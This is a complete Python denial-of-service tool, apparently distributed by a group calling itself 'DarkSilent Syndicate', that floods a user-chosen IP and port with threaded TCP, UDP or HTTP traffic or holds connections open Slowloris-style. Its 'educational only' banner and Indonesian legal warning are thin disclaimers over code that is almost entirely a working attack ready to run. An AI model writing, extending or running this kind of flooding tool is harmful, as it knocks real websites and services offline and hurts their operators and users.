#!/usr/bin/env python3
"""
QUANTUM DDOS SCRIPT - Educational Purposes Only
Created by RianModss - DarkSilent Syndicate
"""

import socket
import threading
import time
import random
import sys
import os
from concurrent.futures import ThreadPoolExecutor

class QuantumDDoS:
    def __init__(self):
        self.target_ip = ""
        self.target_port = 80
        self.attack_method = "TCP"
        self.threads = 100
        self.duration = 60
        self.packet_size = 1024
        self.running = False
        self.sent_packets = 0
        
    def print_banner(self):
        banner = """
        ╔══════════════════════════════════════╗
        ║     ⚡ QUANTUM DDOS TOOL v1.0 ⚡     ║
        ║  For Educational & Testing Only      ║
        ║     Created by: RianModss            ║
        ╚══════════════════════════════════════╝
        """
        print(banner)
    
    def create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(2)
            return sock
        except:
            return None
    
    def tcp_flood(self):
        while self.running:
            try:
                sock = self.create_socket()
                if sock:
                    sock.connect((self.target_ip, self.target_port))
                    
                    # Generate random data
                    data = random._urandom(self.packet_size)
                    
                    # Send multiple packets
                    for _ in range(random.randint(5, 20)):
                        sock.send(data)
                        self.sent_packets += 1
                    
                    sock.close()
                    
            except:
                pass
            
            time.sleep(0.01)
    
    def udp_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(self.packet_size)
                
                for _ in range(random.randint(10, 30)):
                    sock.sendto(data, (self.target_ip, self.target_port))
                    self.sent_packets += 1
                
                sock.close()
            except:
                pass
            
            time.sleep(0.01)
    
    def http_flood(self):
        headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate",
            "Connection: keep-alive",
            "Upgrade-Insecure-Requests: 1"
        ]
        
        while self.running:
            try:
                sock = self.create_socket()
                if sock:
                    sock.connect((self.target_ip, self.target_port))
                    
                    # HTTP GET request
                    request = f"GET / HTTP/1.1\r\n"
                    request += f"Host: {self.target_ip}\r\n"
                    for header in headers:
                        request += f"{header}\r\n"
                    request += "\r\n"
                    
                    sock.send(request.encode())
                    self.sent_packets += 1
                    
                    # Keep connection alive
                    time.sleep(random.uniform(0.1, 0.5))
                    sock.close()
                    
            except:
                pass
    
    def slowloris_attack(self):
        """Slowloris attack - keeps many connections open"""
        sockets = []
        
        try:
            # Create initial connections
            for _ in range(self.threads):
                sock = self.create_socket()
                if sock:
                    sock.connect((self.target_ip, self.target_port))
                    
                    # Send partial HTTP request
                    request = f"GET / HTTP/1.1\r\n"
                    request += f"Host: {self.target_ip}\r\n"
                    sock.send(request.encode())
                    sockets.append(sock)
        except:
            pass
        
        # Keep connections alive
        while self.running and sockets:
            for sock in sockets[:]:
                try:
                    # Send keep-alive headers slowly
                    header = f"X-a: {random.randint(1, 5000)}\r\n"
                    sock.send(header.encode())
                    time.sleep(random.uniform(10, 30))
                except:
                    sockets.remove(sock)
                    try:
                        sock.close()
                    except:
                        pass
        
        # Cleanup
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
    
    def start_attack(self):
        self.running = True
        self.sent_packets = 0
        
        print(f"[+] Starting {self.attack_method} attack on {self.target_ip}:{self.target_port}")
        print(f"[+] Threads: {self.threads}")
        print(f"[+] Duration: {self.duration} seconds")
        print("[+] Press Ctrl+C to stop\n")
        
        start_time = time.time()
        
        # Create thread pool
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            if self.attack_method == "TCP":
                for _ in range(self.threads):
                    executor.submit(self.tcp_flood)
            elif self.attack_method == "UDP":
                for _ in range(self.threads):
                    executor.submit(self.udp_flood)
            elif self.attack_method == "HTTP":
                for _ in range(self.threads):
                    executor.submit(self.http_flood)
            elif self.attack_method == "SLOWLORIS":
                executor.submit(self.slowloris_attack)
            
            # Monitor attack
            try:
                while time.time() - start_time < self.duration and self.running:
                    elapsed = time.time() - start_time
                    print(f"\r[+] Attack ongoing: {elapsed:.1f}s | Packets: {self.sent_packets}", end="")
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[!] Attack stopped by user")
            finally:
                self.running = False
                print(f"\n[+] Attack finished")
                print(f"[+] Total packets sent: {self.sent_packets}")
    
    def get_input(self):
        self.target_ip = input("[?] Target IP/Domain: ").strip()
        
        try:
            port = input("[?] Target Port (default 80): ").strip()
            if port:
                self.target_port = int(port)
        except:
            pass
        
        print("\n[?] Select Attack Method:")
        print("1. TCP Flood")
        print("2. UDP Flood")
        print("3. HTTP Flood")
        print("4. Slowloris")
        
        choice = input("\n[?] Choice (1-4): ").strip()
        methods = {"1": "TCP", "2": "UDP", "3": "HTTP", "4": "SLOWLORIS"}
        self.attack_method = methods.get(choice, "TCP")
        
        try:
            threads = input("[?] Threads (default 100): ").strip()
            if threads:
                self.threads = int(threads)
        except:
            pass
        
        try:
            duration = input("[?] Duration in seconds (default 60): ").strip()
            if duration:
                self.duration = int(duration)
        except:
            pass

def main():
    tool = QuantumDDoS()
    tool.print_banner()
    
    print("[⚠] PERINGATAN: Gunakan hanya untuk testing jaringan yang Anda miliki!")
    print("[⚠] DDoS illegal dan dapat dikenakan sanksi hukum!\n")
    
    confirm = input("[?] Apakah Anda mengerti dan setuju? (y/n): ").lower()
    if confirm != 'y':
        print("[!] Keluar...")
        sys.exit(0)
    
    try:
        tool.get_input()
        tool.start_attack()
    except KeyboardInterrupt:
        print("\n[!] Script dihentikan")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()
